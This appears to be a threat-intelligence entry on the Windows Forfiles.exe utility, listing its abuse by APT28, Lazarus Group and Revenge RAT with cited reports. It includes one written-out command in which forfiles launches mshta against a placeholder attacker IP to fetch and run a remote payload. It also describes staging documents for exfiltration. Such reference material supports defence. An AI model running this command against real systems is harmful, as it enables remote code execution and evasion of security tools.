name: Forfiles.exe
description: Forfiles is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts.
summary: Indirect command execution without invoking cmd
Execute commands to bypass restrictions on command-line interpreters

associated_apts.name: APT28
associated_apts.description: APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms. APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.
associated_apts.sources: Überwachung APT28 Forfiles June 2015 https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/; DOJ GRU Indictment Jul 2018 https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf; TrendMicro Pawn Storm 2019 https://documents.trendmicro.com/assets/white_papers/wp-pawn-storm-in-2019.pdf; Cybersecurity Advisory GRU Brute Force Campaign July 2021 https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF

associated_apts.name: Lazarus Group
associated_apts.description: Lazarus Group persistence mechanisms have used forfiles.exe to execute.htm files.

associated_malware.name: Revenge RAT
associated_malware.description: Revenge RAT uses the Forfiles utility to execute commands on the system.

associated_commands.intent: The report says the script identifies all PDF and Office documents dated after May 1st and collects them in a folder, supposedly ready to be exfiltrated.
associated_commands.source_name: Guarnieri Bundestag Left Party Hack (netzpolitik.org) June 2015

associated_commands.intent: Mandiant says the LNK file uses forfiles.exe to search C:\Windows for win.ini and, for each match, start powershell to retrieve a second-stage payload and execute it with mshta.exe.

associated_commands.command: C:\Windows\System32\forfiles.exe /p c:\windows\system32 /m notepad.exe /c "cmd /c start mshta http ://[attacker-ip]/web"
associated_commands.intent: Malwarebytes says the attacker used forfiles.exe to launch mshta so one trusted program starts another and the execution path is harder for security tools to spot.
